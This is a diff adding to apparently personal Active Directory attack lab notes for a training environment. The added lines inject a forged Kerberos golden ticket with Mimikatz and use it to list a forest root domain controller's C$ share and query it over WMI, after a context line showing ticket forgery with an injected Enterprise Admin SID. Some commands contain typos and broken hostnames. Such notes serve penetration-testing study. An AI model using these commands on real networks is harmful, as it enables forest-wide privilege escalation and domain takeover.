@@ -666,3 +666,20 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 - In the above command, the mimkatz option **"/sids"** is forcefully setting the `sIDHistory` for the Enterprise Admin group for `dollarcorp.moneycorp.local` that is the Forest Enterprise Admin Group.
 
 
+- On any machine of the current domain
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt
+C:\AD\Tools\krbtgt_tkt.kirbi"
+```
+
+- We can now run command s on remote nmachine
+
+```powershell
+ls \\mcorp-dc.moneycorp.local.kirbi\c$
+```
+
+```powershell
+gwmi -class win32_operatingsystem -ComputerName mcorp-
+dc.moneycorp.local
+```
